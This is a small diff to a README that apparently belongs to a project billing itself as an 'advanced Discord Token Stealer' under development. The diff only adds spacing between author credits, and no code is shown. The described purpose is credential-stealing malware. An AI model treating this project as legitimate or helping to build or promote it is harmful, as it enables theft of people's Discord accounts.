@@ -4,6 +4,9 @@ A multipurpose advanced Discord Token Stealer that send all the collected data t
 - **(Still under development)**
 
 Made by:
+
 [Gumbobrot](https://github.com/Gumbobrot)
+
 [ICExFS](https://github.com/ICExFS)
+
 [suegdu](https://github.com/suegdu)
